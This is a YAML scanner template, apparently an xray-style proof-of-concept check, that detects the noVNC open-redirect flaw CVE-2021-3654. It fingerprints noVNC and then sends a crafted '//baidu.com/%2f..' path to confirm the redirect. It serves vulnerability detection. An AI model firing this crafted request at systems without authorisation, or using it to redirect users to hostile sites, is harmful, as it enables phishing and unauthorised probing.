detail:
  author: txf(https://github.com/tangxiaofeng7)
  links:
  - https://seclists.org/oss-sec/2021/q3/188
expression: r0() && r1()
manual: true
name: poc-yaml-novnc-url-redirection-cve-2021-3654
rules:
  r0:
    expression: 'response.status == 200 && response.body.bcontains(b"<title>noVNC</title>")

      '
    request:
      follow_redirects: false
      method: GET
      path: /
  r1:
    expression: 'response.status == 301 && response.headers["location"] == "//baidu.com/%2f../"

      '
    request:
      follow_redirects: false
      method: GET
      path: //baidu.com/%2f..
transport: http
